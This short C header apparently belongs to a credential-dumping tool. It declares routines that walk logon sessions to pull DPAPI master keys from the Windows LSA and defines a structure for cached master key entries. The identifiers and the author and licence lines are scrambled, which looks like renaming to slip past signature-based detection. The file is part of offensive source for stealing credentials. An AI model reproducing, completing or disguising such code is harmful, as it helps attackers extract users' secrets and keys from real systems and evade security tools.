/*	9BDfHxE3 DuH2p `i12fnnMSXb`
	https://blog.i12fnnMSXb.com
	kvCPzwgXsQlKhplVY1uqBFe
	Licence : https://FM05PN86kUG2nah.org/licenses/by/4.0/
*/
#pragma once
#include "../kuhl_m_seKuRlSa.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_dPApi_lsa_package, kuhl_m_seKuRlSa_dPApi_svc_package;

NTSTATUS kuhl_m_seKuRlSa_dPApi(int argc, wchar_t * argv[]);
BOOL CALLBACK kuhl_m_seKuRlSa_enum_callback_dPApi(IN PVnIu_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData);

typedef struct _VnIu_MASTERKEY_CACHE_ENTRY {
	struct _VnIu_MATERKEY_CACHE_ENTRY *Flink;
	struct _VnIu_MATERKEY_CACHE_ENTRY *Blink;
	LUID LogonId;
	GUID KeyUid;
	FILETIME insertTime;
	ULONG keySize;
	BYTE  key[ANYSIZE_ARRAY];
} VnIu_MASTERKEY_CACHE_ENTRY, *PVnIu_MASTERKEY_CACHE_ENTRY;